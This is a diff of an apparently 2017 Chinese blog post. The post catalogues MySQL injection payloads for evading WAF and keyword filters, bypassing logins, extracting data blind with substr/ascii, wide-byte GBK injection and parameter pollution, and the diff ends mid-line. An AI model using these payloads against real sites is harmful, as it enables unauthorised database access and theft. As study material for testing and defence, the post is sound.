@@ -112,19 +112,19 @@
 
 
 
-<meta name="description" content="绕过单引号   语句 解释     SELECT _FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNun">
+<meta name="description" content="大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过1?id=1+un/**/ion+se/**/lect+1,2,3-- 特殊嵌入绕过1?id=1/*!UnIoN*/SeLecT+1,2,3-- 字符串格式12345&amp;apos; or &amp;quot;a&amp;quot;=&amp;apos;a&amp;apos">
 <meta name="keywords" content="Mysql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MySql注入-各种绕过姿势">
 <meta property="og:url" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/index.html">
 <meta property="og:site_name" content="KidHat">
-<meta property="og:description" content="绕过单引号   语句 解释     SELECT _FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNun">
+<meta property="og:description" content="大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过1?id=1+un/**/ion+se/**/lect+1,2,3-- 特殊嵌入绕过1?id=1/*!UnIoN*/SeLecT+1,2,3-- 字符串格式12345&amp;apos; or &amp;quot;a&amp;quot;=&amp;apos;a&amp;apos">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/类型转换.png">
-<meta property="og:updated_time" content="2017-11-07T04:33:56.673Z">
+<meta property="og:updated_time" content="2017-11-07T09:38:14.627Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySql注入-各种绕过姿势">
-<meta name="twitter:description" content="绕过单引号   语句 解释     SELECT _FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNun">
+<meta name="twitter:description" content="大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过1?id=1+un/**/ion+se/**/lect+1,2,3-- 特殊嵌入绕过1?id=1/*!UnIoN*/SeLecT+1,2,3-- 字符串格式12345&amp;apos; or &amp;quot;a&amp;quot;=&amp;apos;a&amp;apos">
 <meta name="twitter:image" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/类型转换.png">
 
 
@@ -387,28 +387,11 @@
       
 
       
-        <h1 id="绕过单引号"><a href="#绕过单引号" class="headerlink" title="绕过单引号"></a>绕过单引号</h1><table>
-<thead>
-<tr>
-<th><strong>语句</strong></th>
-<th><strong>解释</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>SELECT _FROM Users WHERE username = <code>0x61646D696E</code></td>
-<td>HEX编码</td>
-</tr>
-<tr>
-<td>SELECT FROM Users WHERE username = <code>CHAR(97, 100, 109, 105, 110)</code></td>
-<td>CHAR()函数</td>
-</tr>
-</tbody>
-</table>
-<h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+UnIoN+SeLecT`+1,2,3--</div></pre></td></tr></table></figure>
+        <h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+UnIoN+SeLecT`+1,2,3--</div></pre></td></tr></table></figure>
 <h1 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+UNunionION+SEselectLECT+1,2,3--</div></pre></td></tr></table></figure>
 <h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+un/**/ion+se/**/lect+1,2,3--</div></pre></td></tr></table></figure>
 <h1 id="特殊嵌入绕过"><a href="#特殊嵌入绕过" class="headerlink" title="特殊嵌入绕过"></a>特殊嵌入绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1/*!UnIoN*/SeLecT+1,2,3--</div></pre></td></tr></table></figure>
+<h1 id="字符串格式"><a href="#字符串格式" class="headerlink" title="字符串格式"></a>字符串格式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos; or &quot;a&quot;=&apos;a&apos;</div><div class="line">&apos; or &apos;a&apos;=n&apos;a&apos;               //unicode</div><div class="line">&apos; or &apos;a&apos;=b&apos;1100001&apos;         //binary</div><div class="line">&apos; or &apos;a&apos;=_binary&apos;1100001&apos;   //5.5.41下测试无效</div><div class="line">&apos; or &apos;a&apos;=x&apos;61&apos;              //16进制</div></pre></td></tr></table></figure>
 <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入<code>%bf%27</code>时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符”縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
 <h1 id="MySQL版本号字符"><a href="#MySQL版本号字符" class="headerlink" title="MySQL版本号字符"></a>MySQL版本号字符</h1><p>Examples:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+</div><div class="line">SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);</div></pre></td></tr></table></figure></p>
 <ul>
@@ -420,103 +403,6 @@
 <p><code>$mysqli-&gt;query(&quot;set names utf8&quot;);</code></p>
 <p>在sql查询中</p>
 <p>test.php?username=admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等</p>
-<h1 id="绕空格"><a href="#绕空格" class="headerlink" title="绕空格"></a>绕空格</h1><h2 id="特殊字符绕过空格"><a href="#特殊字符绕过空格" class="headerlink" title="特殊字符绕过空格"></a>特殊字符绕过空格</h2><table>
-<thead>
-<tr>
-<th><strong>字符</strong></th>
-<th><strong>解释</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>09</td>
-<td>Horizontal Tab</td>
-</tr>
-<tr>
-<td>0A</td>
-<td>New Line</td>
-</tr>
-<tr>
-<td>0B</td>
-<td>Vertical Tab</td>
-</tr>
-<tr>
-<td>0C</td>
-<td>New Page</td>
-</tr>
-<tr>
-<td>0D</td>
-<td>Carriage Return</td>
-</tr>
-<tr>
-<td>A0</td>
-<td>Non-breaking Space</td>
-</tr>
-<tr>
-<td>20</td>
-<td>Space</td>
-</tr>
-</tbody>
-</table>
-<p>Example:</p><p></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;&apos;%0AUNION%0CSELECT%A0NULL%20%23</div></pre></td></tr></table></figure>
-<h2 id="括号绕过空格"><a href="#括号绕过空格" class="headerlink" title="括号绕过空格"></a>括号绕过空格</h2><table>
-<thead>
-<tr>
-<th><strong>字符</strong></th>
-<th><strong>解释</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>28</td>
-<td>(</td>
-</tr>
-<tr>
-<td>29</td>
-<td>)</td>
-</tr>
-</tbody>
-</table>
-<p>Example:</p><p></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/p&gt;UNION(SELECT(column)FROM(table))</div></pre></td></tr></table></figure>
-<h2 id="and-or后插入字符绕过空格"><a href="#and-or后插入字符绕过空格" class="headerlink" title="and/or后插入字符绕过空格"></a>and/or后插入字符绕过空格</h2><p>任意混合+ - ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and-++-1=1;需要偶数个--</div><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and!! ~~~~!1=1;需要奇数个！</div></pre></td></tr></table></figure></p>
-<p>其实一下的字符都可以测试</p>
-<table>
-<thead>
-<tr>
-<th><strong>字符</strong></th>
-<th><strong>释意</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>20</td>
-<td>Space</td>
-</tr>
-<tr>
-<td>2B</td>
-<td>+</td>
-</tr>
-<tr>
-<td>2D</td>
-<td>–</td>
-</tr>
-<tr>
-<td>7E</td>
-<td>~</td>
-</tr>
-<tr>
-<td>21</td>
-<td>!</td>
-</tr>
-<tr>
-<td>40</td>
-<td>@</td>
-</tr>
-</tbody>
-</table>
-<h2 id="注释符-amp-引号"><a href="#注释符-amp-引号" class="headerlink" title="注释符&amp;引号"></a>注释符&amp;引号</h2><p>SELECTDISTINCT(db) FROM mysql.db WHERE Host=”localhost” and<code>/**/</code>1=1;<br>SELECT DISTINCT(db) FROM mysql.db WHERE Host=<code>&#39;localhost&#39;</code> and&quot;1=1&quot;;</p>
 <h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><table>
 <thead>
 <tr>
@@ -566,11 +452,134 @@
 </tr>
 </tbody>
 </table>
+<h1 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h1><h2 id="绕过单引号"><a href="#绕过单引号" class="headerlink" title="绕过单引号"></a>绕过单引号</h2><table>
+<thead>
+<tr>
+<th><strong>语句</strong></th>
+<th><strong>解释</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT _FROM Users WHERE username = <code>0x61646D696E</code></td>
+<td>HEX编码</td>
+</tr>
+<tr>
+<td>SELECT FROM Users WHERE username = <code>CHAR(97, 100, 109, 105, 110)</code></td>
+<td>CHAR()函数</td>
+</tr>
+</tbody>
+</table>
+<h2 id="绕空格"><a href="#绕空格" class="headerlink" title="绕空格"></a>绕空格</h2><h3 id="特殊字符绕过空格"><a href="#特殊字符绕过空格" class="headerlink" title="特殊字符绕过空格"></a>特殊字符绕过空格</h3><table>
+<thead>
+<tr>
+<th><strong>字符</strong></th>
+<th><strong>解释</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>09</td>
+<td>Horizontal Tab</td>
+</tr>
+<tr>
+<td>0A</td>
+<td>New Line</td>
+</tr>
+<tr>
+<td>0B</td>
+<td>Vertical Tab</td>
+</tr>
+<tr>
+<td>0C</td>
+<td>New Page</td>
+</tr>
+<tr>
+<td>0D</td>
+<td>Carriage Return</td>
+</tr>
+<tr>
+<td>A0</td>
+<td>Non-breaking Space</td>
+</tr>
+<tr>
+<td>20</td>
+<td>Space</td>
+</tr>
+</tbody>
+</table>
+<p>Example:</p><p></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;&apos;%0AUNION%0CSELECT%A0NULL%20%23</div></pre></td></tr></table></figure>
+<h3 id="括号绕过空格"><a href="#括号绕过空格" class="headerlink" title="括号绕过空格"></a>括号绕过空格</h3><table>
+<thead>
+<tr>
+<th><strong>字符</strong></th>
+<th><strong>解释</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>28</td>
+<td>(</td>
+</tr>
+<tr>
+<td>29</td>
+<td>)</td>
+</tr>
+</tbody>
+</table>
+<p>Example:</p><p></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/p&gt;UNION(SELECT(column)FROM(table))</div></pre></td></tr></table></figure>
+<h3 id="and-or后插入字符绕过空格"><a href="#and-or后插入字符绕过空格" class="headerlink" title="and/or后插入字符绕过空格"></a>and/or后插入字符绕过空格</h3><p>任意混合+ - ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and-++-1=1;需要偶数个--</div><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and!! ~~~~!1=1;需要奇数个！</div></pre></td></tr></table></figure></p>
+<p>其实一下的字符都可以测试</p>
+<table>
+<thead>
+<tr>
+<th><strong>字符</strong></th>
+<th><strong>释意</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>20</td>
+<td>Space</td>
+</tr>
+<tr>
+<td>2B</td>
+<td>+</td>
+</tr>
+<tr>
+<td>2D</td>
+<td>–</td>
+</tr>
+<tr>
+<td>7E</td>
+<td>~</td>
+</tr>
+<tr>
+<td>21</td>
+<td>!</td>
+</tr>
+<tr>
+<td>40</td>
+<td>@</td>
+</tr>
+</tbody>
+</table>
+<h3 id="注释符-amp-引号"><a href="#注释符-amp-引号" class="headerlink" title="注释符&amp;引号"></a>注释符&amp;引号</h3><p>SELECTDISTINCT(db) FROM mysql.db WHERE Host=”localhost” and<code>/**/</code>1=1;<br>SELECT DISTINCT(db) FROM mysql.db WHERE Host=<code>&#39;localhost&#39;</code> and&quot;1=1&quot;;</p>
+<h1 id="函数过滤绕过"><a href="#函数过滤绕过" class="headerlink" title="函数过滤绕过"></a>函数过滤绕过</h1><p>构建字符串相关函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">unhex char hex ascii ord substr substring mid pad left right insert</div><div class="line">&apos; and substr(data,1,1) = &apos;a&apos;#</div><div class="line">&apos; and substr(data,1,1) = 0x61# 0x6162</div><div class="line">&apos; and substr(data,1,1) = unhex(61)# unhex(6162)</div><div class="line">&apos; and substr(data,1,1) = char(97)# char(97,98)</div><div class="line">&apos; and hex(substr(data,1,1)) = 61#</div><div class="line">&apos; and ascii(substr(data,1,1)) = 97#</div><div class="line">&apos; and ord(substr(data,1,1)) = 97#</div></pre></td></tr></table></figure></p>
+<p>使用conv来进行进制的转换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&apos; and substr(data,1,1) = lower(conv(10,10,36))# &apos;a&apos;</div><div class="line">&apos; and substr(data,1,1) = lower(conv(11,10,36))# &apos;b&apos;</div><div class="line">&apos; and substr(data,1,1) = lower(conv(36,10,36))# &apos;z&apos;</div></pre></td></tr></table></figure></p>
+<p>使用函数来猜解数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&apos; and substr(data,1,1) = &apos;a&apos;#</div><div class="line">&apos; and substring(data,1,1) = &apos;a&apos;#</div><div class="line">&apos; and mid(data,1,1) = &apos;a&apos;#</div></pre></td></tr></table></figure></p>
+<p>不适用逗号来获取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and substr(data from 1 for 1) = &apos;a&apos;#</div></pre></td></tr></table></figure></p>
+<p>同样也可以使用一下比较少见的函数来尝试绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lpad(data,1,space(1)) // lpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;??hi&apos;</div><div class="line">rpad(data,1,space(1)) // rpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;hi??&apos;</div><div class="line">left(data,1)</div><div class="line">reverse(right(reverse(data),1))</div><div class="line">insert(insert(version(),1,0,space(0)),2,222,space(0))</div></pre></td></tr></table></figure></p>
+<p>有些函数有类似搜索匹配的功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&apos;-if(locate(&apos;f&apos;,data),1,0)#</div><div class="line">&apos;-if(locate(&apos;fo&apos;,data),1,0)#</div><div class="line">&apos;-if(locate(&apos;foo&apos;,data),1,0)#</div><div class="line">instr(), position()</div></pre></td></tr></table></figure></p>
+<p>使用函数进行字符串的切割<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">length(trim(leading &apos;a&apos; FROM data)) # length will be shorter</div><div class="line">length(replace(data, &apos;a&apos;, &apos;&apos;)) # length will be shorter</div></pre></td></tr></table></figure></p>
+<p>2种方式都是相同效果</p>
 <h1 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h1><h2 id="绕过语句：’-’"><a href="#绕过语句：’-’" class="headerlink" title="绕过语句：’=’"></a>绕过语句：’=’</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select data from users where name=&quot;=&quot;</div><div class="line">select data from users where flase=&quot;</div><div class="line">select data from users where 0=0</div></pre></td></tr></table></figure>
 <h2 id="绕过语句：-39-39"><a href="#绕过语句：-39-39" class="headerlink" title="绕过语句：&#39;-&#39;"></a>绕过语句：&#39;-&#39;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select data from users where name=&apos;&apos;-&apos;&apos;</div><div class="line">select data from users where name=0-0</div><div class="line">select data from users where 0=0</div></pre></td></tr></table></figure>
 <p>比如登录的时候需要输入email和passwd，可以这样输入</p>
 <p>email=&#39;&#39;&amp;password=&#39;&#39;</p>
-<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&apos; or 1=true</div><div class="line">&apos; or 1</div><div class="line">select * from users where &apos;a&apos;=&apos;b&apos;=&apos;c&apos;</div><div class="line">select * from users where (&apos;a&apos;=&apos;b&apos;)=&apos;c&apos;</div><div class="line">select * from users where (false)=&apos;c&apos;</div><div class="line">select * from users where (0)=&apos;c&apos;</div><div class="line">select * from users where (0)=0</div><div class="line">select * from users where trueselect * from users</div></pre></td></tr></table></figure>
+<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&apos; or 1=true          #true=1, false=0</div><div class="line">&apos; or 1               #true</div><div class="line">&apos; or version()=5.5   #5.5.41-log</div><div class="line"></div><div class="line">&apos; or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4</div><div class="line"></div><div class="line">select * from users where &apos;a&apos;=&apos;b&apos;=&apos;c&apos;</div><div class="line">select * from users where (&apos;a&apos;=&apos;b&apos;)=&apos;c&apos;</div><div class="line">select * from users where (false)=&apos;c&apos;</div><div class="line">select * from users where (0)=&apos;c&apos;</div><div class="line">select * from users where (0)=0</div><div class="line">select * from users where true</div><div class="line">select * from users</div></pre></td></tr></table></figure>
 <p> <img src="/2017/11/07/MySql注入-各种绕过姿势/类型转换.png" alt=""></p>
 <p>当把字符串转为数字的时候，其实是从左边开始处理的。</p>
 <ul>
@@ -651,6 +660,8 @@
 </tr>
 </tbody>
 </table>
+<h1 id="conv函数"><a href="#conv函数" class="headerlink" title="conv函数"></a>conv函数</h1><p>使用<code>conv([10-36],10,36)</code>可以实现所有字符的表示<br><strong><em>CONV(N,from_base,to_base)</em></strong><br><code>N</code>是要转换的数据，<code>from_base</code>是原进制，<code>to_base</code>是目标进制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K</div><div class="line">true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L</div><div class="line">true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M</div><div class="line">floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N</div><div class="line">ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O</div><div class="line">floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P</div><div class="line">ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q</div><div class="line">ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R</div><div class="line">floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S</div><div class="line">floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T</div></pre></td></tr></table></figure></p>
+<p><a href="http://blog.csdn.net/u010902721/article/details/48954647" target="_blank" rel="external">MySql 各种函数</a><br><a href="http://blog.sina.com.cn/s/blog_4586764e0100h5ct.html" target="_blank" rel="external">MySql函数大全及用法</a></p>
 <h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p>当我们传入的参数为</p>
 <p><a href="http://sqlinjection.com/?par1=val1&amp;par1=val2" target="_blank" rel="external">http://sqlinjection.com/?par1=val1&amp;par1=val2</a></p>
 <p>进入到不同的Web Server就可能得到不同的结果，这里借鉴一下国外大佬一篇文章的总结，如下：</p>
@@ -989,7 +1000,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过单引号"><span class="nav-number">1.</span> <span class="nav-text">绕过单引号</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#大小写绕过"><span class="nav-number">2.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#替换绕过"><span class="nav-number">3.</span> <span class="nav-text">替换绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注释绕过"><span class="nav-number">4.</span> <span class="nav-text">注释绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特殊嵌入绕过"><span class="nav-number">5.</span> <span class="nav-text">特殊嵌入绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">6.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL版本号字符"><span class="nav-number">7.</span> <span class="nav-text">MySQL版本号字符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符编码绕过"><span class="nav-number">8.</span> <span class="nav-text">字符编码绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕空格"><span class="nav-number">9.</span> <span class="nav-text">绕空格</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#特殊字符绕过空格"><span class="nav-number">9.1.</span> <span class="nav-text">特殊字符绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#括号绕过空格"><span class="nav-number">9.2.</span> <span class="nav-text">括号绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#and-or后插入字符绕过空格"><span class="nav-number">9.3.</span> <span class="nav-text">and/or后插入字符绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注释符-amp-引号"><span class="nav-number">9.4.</span> <span class="nav-text">注释符&引号</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编码绕过"><span class="nav-number">10.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关键字绕过"><span class="nav-number">11.</span> <span class="nav-text">关键字绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#认证绕过"><span class="nav-number">12.</span> <span class="nav-text">认证绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过语句：’-’"><span class="nav-number">12.1.</span> <span class="nav-text">绕过语句：’=’</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过语句：-39-39"><span class="nav-number">12.2.</span> <span class="nav-text">绕过语句：'-'</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类型转换"><span class="nav-number">13.</span> <span class="nav-text">类型转换</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP参数污染"><span class="nav-number">14.</span> <span class="nav-text">HTTP参数污染</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战正则过滤绕过"><span class="nav-number">15.</span> <span class="nav-text">实战正则过滤绕过</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#大小写绕过"><span class="nav-number">1.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#替换绕过"><span class="nav-number">2.</span> <span class="nav-text">替换绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注释绕过"><span class="nav-number">3.</span> <span class="nav-text">注释绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特殊嵌入绕过"><span class="nav-number">4.</span> <span class="nav-text">特殊嵌入绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符串格式"><span class="nav-number">5.</span> <span class="nav-text">字符串格式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">6.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL版本号字符"><span class="nav-number">7.</span> <span class="nav-text">MySQL版本号字符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符编码绕过"><span class="nav-number">8.</span> <span class="nav-text">字符编码绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编码绕过"><span class="nav-number">9.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关键字绕过"><span class="nav-number">10.</span> <span class="nav-text">关键字绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关键字过滤绕过"><span class="nav-number">11.</span> <span class="nav-text">关键字过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过单引号"><span class="nav-number">11.1.</span> <span class="nav-text">绕过单引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕空格"><span class="nav-number">11.2.</span> <span class="nav-text">绕空格</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊字符绕过空格"><span class="nav-number">11.2.1.</span> <span class="nav-text">特殊字符绕过空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#括号绕过空格"><span class="nav-number">11.2.2.</span> <span class="nav-text">括号绕过空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#and-or后插入字符绕过空格"><span class="nav-number">11.2.3.</span> <span class="nav-text">and/or后插入字符绕过空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注释符-amp-引号"><span class="nav-number">11.2.4.</span> <span class="nav-text">注释符&引号</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#函数过滤绕过"><span class="nav-number">12.</span> <span class="nav-text">函数过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#认证绕过"><span class="nav-number">13.</span> <span class="nav-text">认证绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过语句：’-’"><span class="nav-number">13.1.</span> <span class="nav-text">绕过语句：’=’</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过语句：-39-39"><span class="nav-number">13.2.</span> <span 